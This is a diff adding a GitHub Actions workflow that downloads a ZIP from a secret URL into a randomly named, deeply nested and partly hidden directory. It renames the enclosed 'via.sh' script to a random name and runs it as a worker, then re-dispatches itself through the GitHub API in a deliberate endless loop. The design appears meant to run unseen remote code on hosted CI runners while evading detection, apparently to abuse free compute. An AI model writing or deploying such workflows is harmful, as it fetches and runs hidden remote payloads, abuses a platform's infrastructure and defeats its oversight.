@@ -1,0 +1,163 @@
+name: Maf
+
+# Only manual / API trigger
+on:
+  workflow_dispatch:
+
+permissions:
+  # Least privileges; allow actions:workflow so token can trigger workflows if needed.
+  actions: write
+  contents: read
+
+jobs:
+  export-and-run:
+    runs-on: ubuntu-22.04
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Generate random names and nested directory
+        id: names
+        shell: bash
+        run: |
+          set -euo pipefail
+          ZIP_NAME="$(uuidgen).zip"
+          SCRIPT_PREFIX="$(uuidgen)"
+          
+          # Generate a deeply nested directory structure (14+ levels)
+          DEPTH=$((14 + RANDOM % 7))  # 14 to 20 levels deep
+          NESTED_DIR=""
+          
+          for i in $(seq 1 $DEPTH); do
+            # Randomly choose between hidden (.) and normal directories
+            if [ $((RANDOM % 2)) -eq 0 ]; then
+              DIR_NAME=".$(uuidgen | cut -d'-' -f1)"
+            else
+              DIR_NAME="$(uuidgen | cut -d'-' -f1)"
+            fi
+            
+            if [ -z "$NESTED_DIR" ]; then
+              NESTED_DIR="$DIR_NAME"
+            else
+              NESTED_DIR="$NESTED_DIR/$DIR_NAME"
+            fi
+          done
+          
+          echo "ZIP_NAME=$ZIP_NAME" >> "$GITHUB_ENV"
+          echo "SCRIPT_PREFIX=$SCRIPT_PREFIX" >> "$GITHUB_ENV"
+          echo "NESTED_DIR=$NESTED_DIR" >> "$GITHUB_ENV"
+          echo "Generated ZIP_NAME=$ZIP_NAME"
+          echo "Generated SCRIPT_PREFIX=$SCRIPT_PREFIX"
+          echo "Generated nested directory with $DEPTH levels: $NESTED_DIR"
+          
+          # Create the nested directory structure
+          mkdir -p "$NESTED_DIR"
+          echo "Created nested directory structure"
+      
+      - name: Download ZIP to nested directory
+        shell: bash
+        run: |
+          set -euo pipefail
+          TARGET_PATH="$NESTED_DIR/$ZIP_NAME"
+          curl -fSL -o "$TARGET_PATH" "${{ secrets.VIA }}"
+          if [ ! -f "$TARGET_PATH" ]; then
+            echo "Download failed: $TARGET_PATH not found"
+            exit 1
+          fi
+          echo "Downloaded $ZIP_NAME to $NESTED_DIR"
+      
+      - name: Unzip in nested directory and cleanup
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd "$NESTED_DIR"
+          unzip -q "$ZIP_NAME"
+          rm -f "$ZIP_NAME"
+          echo "Unzipped and removed $ZIP_NAME in $NESTED_DIR"
+      
+      - name: Find, rename and make script executable
+        shell: bash
+        env:
+          SCRIPT_PREFIX: ${{ env.SCRIPT_PREFIX }}
+        run: |
+          set -euo pipefail
+          cd "$NESTED_DIR"
+          
+          script_path="$(find . -type f -name 'via.sh' -print -quit || true)"
+          if [ -z "$script_path" ]; then
+            script_path="$(find . -type f -iname 'via*' -perm /111 -print -quit || true)"
+          fi
+          if [ -z "$script_path" ]; then
+            echo "Could not find via.sh or executable via* file."
+            find . -maxdepth 4 -type f -print
+            exit 1
+          fi
+          
+          echo "Found script: $script_path"
+          new_name="${SCRIPT_PREFIX}_$(date +%s)_$RANDOM.sh"
+          mv -v "$script_path" "$new_name"
+          chmod +x "$new_name"
+          
+          # Store the full path to the script
+          FULL_SCRIPT_PATH="$NESTED_DIR/$new_name"
+          echo "EXEC_SCRIPT=$FULL_SCRIPT_PATH" >> "$GITHUB_ENV"
+          echo "Renamed script to $new_name in $NESTED_DIR"
+      
+      - name: Run worker (with debug)
+        shell: bash
+        env:
+          WORKER_ID: ${{ matrix.worker }}
+          MAX_WORKERS: ${{ env.MAX_WORKERS }}
+          EXEC_SCRIPT: ${{ env.EXEC_SCRIPT }}
+        run: |
+          set -euo pipefail
+          echo "Starting worker $WORKER_ID of $MAX_WORKERS"
+          if [ -z "${EXEC_SCRIPT:-}" ]; then
+            echo "EXEC_SCRIPT not set"
+            exit 1
+          fi
+          echo "About to execute: bash -x \"$EXEC_SCRIPT\" \"$WORKER_ID\""
+          bash -x "$EXEC_SCRIPT" "$WORKER_ID"
+
+      # --------------------------------------------------------------------
+      # Final step: trigger the same workflow again via the REST API.
+      # - Provide a PAT in repository secret REPO_PAT (recommended), or the workflow will fall back to GITHUB_TOKEN.
+      # - WARNING: This creates a continuous loop. Add a conditional/variable if you want to stop at some point.
+      # --------------------------------------------------------------------
+      - name: Trigger next run (workflow_dispatch)
+        shell: bash
+        env:
+          REPO: ${{ github.repository }}
+          WORKFLOW_FILE: main.yml        # <-- make sure this matches the filename of this workflow
+          BRANCH: ${{ github.event.repository.default_branch }}
+          REPO_PAT: ${{ secrets.REPO_PAT }}      # optional PAT; create this secret if you need a PAT
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}  # fallback
+        run: |
+          set -euo pipefail
+
+          # Choose token: prefer REPO_PAT if provided, otherwise fall back to GITHUB_TOKEN
+          TOKEN="${REPO_PAT:-}"
+          if [ -z "$TOKEN" ]; then
+            TOKEN="${GITHUB_TOKEN:-}"
+            echo "No REPO_PAT provided. Falling back to GITHUB_TOKEN."
+          else
+            echo "Using REPO_PAT from secrets."
+          fi
+
+          if [ -z "$TOKEN" ]; then
+            echo "No token available to trigger workflow. Set secrets.REPO_PAT or ensure GITHUB_TOKEN is available."
+            exit 1
+          fi
+
+          API_URL="https://api.github.com/repos/$REPO/actions/workflows/$WORKFLOW_FILE/dispatches"
+          echo "Calling $API_URL on ref $BRANCH"
+
+          curl -sS -X POST "$API_URL" \
+            -H "Accept: application/vnd.github+json" \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Content-Type: application/json" \
+            -d "{\"ref\":\"$BRANCH\"}"
+
+          echo "Triggered workflow dispatch for $WORKFLOW_FILE on ref $BRANCH"
